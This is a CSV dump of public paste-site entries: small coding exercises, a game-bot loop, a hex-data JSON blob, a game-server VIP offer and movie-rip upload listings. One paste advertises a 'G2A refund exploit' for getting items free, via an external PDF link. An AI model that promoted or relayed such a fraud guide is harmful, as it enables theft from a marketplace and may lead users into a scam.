id,title,username,language,date,content
icqbhZGG,data788,TestGuy1,JSON,Wednesday 20th of December 2023 06:00:10 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '2734567198d32241626a3158ea97d41aeed6d92688192d7d2be9d503951c064cdbf98fd629996739ea2ca0386c83b1c8dcf1c0d4c0ecb2dab69335fa5864fec0493e9b740ed8834642e9c3ad01f324deb4e5a9079fdd0cb0e6a8f2809b3247ce874eb19bb5cd5538784d8d0831f9f16f707097029d47b320c911afcc30a18f16',
  otherdata: [
    'b16dfdff2eaf9fdc5738bef465c0c695',
    '71d363ed6c16cfaf5aec27749ebf7fb0',
    '4293014a936d7c1b0e57ba8590a3c055',
    '49dd5c47e7eeab897e73b607eb093ca0',
    '0a7cd020bc8623ae6405f5afc0d2dcbc',
    '8dedba2dce4723c1e8f5563410b854aa',
    'eb0b8ac672db09b19a2227ca96ab0a37',
    'f00be01927212b4f9d225e424e2098c9'
  ]
}"
sHgSPNnx,Untitled,TakePen,AutoIt,Wednesday 20th of December 2023 05:59:28 AM CDT,"For $i = 1 To $afWAYPOINTS_MissingDaughter_WayToFarm[0][0]
		OutLn(""Running to farm #"" & $i)
        _MissingDaughter_MoveAndFlag($afWAYPOINTS_MissingDaughter_WayToFarm[$i][0], _
                                        $afWAYPOINTS_MissingDaughter_WayToFarm[$i][1], _
                                        _MissingDaughter_MoveToCallback_Speedboost)
        If _Agent_IsDead($g_mPlayer) Then Return False
        If $g_bStopRun Then Return False
    Next"
sQ9RW0r0,Soal W14 - 2,ChaeYuriya,Go,Wednesday 20th of December 2023 05:57:28 AM CDT,"package main

import ""fmt""

func main() {
	var num int
	fmt.Scan(&num)
	for i := 1; i <= num; i++ {
		for j := num; j > 0; j-- {
			fmt.Print(j)
		}
		fmt.Print(""\n"")
	}
}"
4xu6LiRi,t3,pb_jiang,C++,Wednesday 20th of December 2023 05:45:46 AM CDT,"#include <assert.h>
#include <bits/stdc++.h>
using namespace std;

bool is_square(const vector<vector<int>> &g, int r, int c, int len)
{
    if (r - len < 0 || c - len < 0)
        return false;
    for (int i = r; i >= r - len; --i)
        if (g[i][c] == 0 || g[i][c - len] == 0)
            return false;
    for (int i = c; i >= c - len; --i)
        if (g[r][i] == 0 || g[r - len][i] == 0)
            return false;
    return true;
}

int main(int argc, char **argv)
{
    int n, m;
    cin >> n >> m;
    vector<vector<int>> g(n, vector<int>(m));
    for (int i = 0; i < n; ++i)
        for (int j = 0; j < m; ++j)
            cin >> g[i][j];
    int ans_r, ans_c, ans_w = 0;
    for (int i = 0; i < n; ++i)
        for (int j = 0; j < m; ++j) {
            int max_d = min(i, j);
            while (max_d >= ans_w) {
                if (is_square(g, i, j, max_d))
                    ans_w = max_d + 1, ans_r = i, ans_c = j;
                max_d--;
            }
        }
    cout << ans_r << ' ' << ans_c << ' ' << ans_w << endl;
    return 0;
};
"
VV0Vmdwv,Lost4Dead.ru A Free-VIP For One Year,winn1337,C++,Wednesday 20th of December 2023 05:45:19 AM CDT,"[RUS]: Как получить бесплатный вип?

- Вы должны: написать где-нибудь ( на сервере в чате ( даже если там нет меня (Win), Я увижу историю чата и потом поставлю ); на сайте в чате, не важно где ... ), что Вы хотите получить бесплатный ВИП. Далее - Вы его получаете, РОВНО на один год, бесплатно.

Условие получения VIP и остальное:

1) Вы должны играть на сервере на протяжении всего года ( хотя-бы - раз в полмесяца-месяц, по полтора-два часа ). Если Вы не сможете играть хотя-бы по этому условию - советуем его приобрести на месяц, за 250 рублей;

2) Если Вы не заходили на сервер два и более месяца - Администрация снимет с Вас VIP, и больше его не даст за бесплатно.

Данное предложение будет активно до 1-ого января, 2024-ого года. Количество мест - не ограниченно.

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
[ENG]: How to get a Free-VIP?
 
- You need to: write somewhere ( in the server's chat ( even if me (Win) are not in the server, at this moment ); or in the site, it's doesn't matter ... ) that you wanna get a free-VIP. After this, You'll became a new VIP, for one year.

The Conditions and the other things that needs to know before asking for the free-vip:

1) You need to be more activity and play in this server ( at least - 2-3 games per a half of one month / one month );

2) If you will be inactive in this server for 2 months or more - your VIP will be removed and you never can't get a free-vip again.

This offer will be active from this moment to 1-st of January, 2024. Free VIP-Places - no limit."
KGFYeqnP,Soal W14 - 1,ChaeYuriya,Go,Wednesday 20th of December 2023 05:42:23 AM CDT,"package main

import ""fmt""

func main() {
	var num int
	fmt.Scan(&num)
	for i := 1; i <= num; i++ {
		for j := 1; j <= num; j++ {
			fmt.Print(j)
		}
		fmt.Print(""\n"")
	}
}
"
NALGaFvY,G2A Refund Exploit Dec 2023,G2ARefundExploit,GetText,Wednesday 20th of December 2023 05:35:42 AM CDT,"G2A refund exploit updated guide - any item for free on G2A.com

https://drive.google.com/file/d/1AKxSk9vs38aBF7GEDJxf8mNi-_NVRLQ9/view#g2a_refund_exploit.pdf

Working as of 
13 December 2023

138524"
1ucCkTCu,Sophie.Scholl.2005.Deu.DVDRip.mpeg.ac3.Subs-bp,bpmircea,BrainFuck,Wednesday 20th of December 2023 05:34:36 AM CDT,"Sophie Scholl - Die letzten Tage (Sophie Scholl: The Final Days) (Marc Rothemund, 2005)
aka
Sophie.Scholl.2005.Deu.DVDRip.mpeg.ac3.Subs-bp
https://www.imdb.com/title/tt0426578/

Uploading..."
kPdSzau1,Untitled,Kaban4ik,Java,Wednesday 20th of December 2023 05:20:48 AM CDT,"public class A {
    private int a = 14;
    public void a() {
        a++;
        System.out.println(a);
    }
}
 
public class B {
    private int b;
    public void b(A a) {
        a.a();
        b++;
        System.out.println(b);
    }
 
    public static void main(String[] args) {
        A a1 = new A();
        A a2 = new A();
        B b = new B();

        a1.a();  
        a2.a();  
        b.b(a1); 

        a1.a(); 
        a2.a(); 
    }
}"
LBwa8g6R,Sophie.Scholl.2005.Deu.DVDRip.mpeg.mp3.Subs-bp,bpmircea,BrainFuck,Wednesday 20th of December 2023 05:14:24 AM CDT,"Sophie Scholl - Die letzten Tage (Sophie Scholl: The Final Days) (Marc Rothemund, 2005)
aka
Sophie.Scholl.2005.Deu.DVDRip.mpeg.mp3.Subs-bp
https://www.imdb.com/title/tt0426578/

Uploading..."
